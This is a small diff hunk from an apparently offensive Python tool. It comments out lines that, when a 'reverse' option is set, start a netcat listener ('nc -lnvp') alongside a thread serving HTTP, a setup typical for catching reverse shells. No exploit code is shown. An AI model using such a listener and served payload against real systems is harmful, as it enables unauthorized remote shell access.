@@ -154,8 +154,8 @@ def main(args):
     if args.reverse:
         t = threading.Thread(target=serve_http, args=())
         t.start()
-        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
-        os.system(f"nc -lnvp {args.reverse}")
+        #print(f"[+] starting 'nc -lvnp {args.reverse}' ")
+        #os.system(f"nc -lnvp {args.reverse}")
 
     else:
         serve_http()
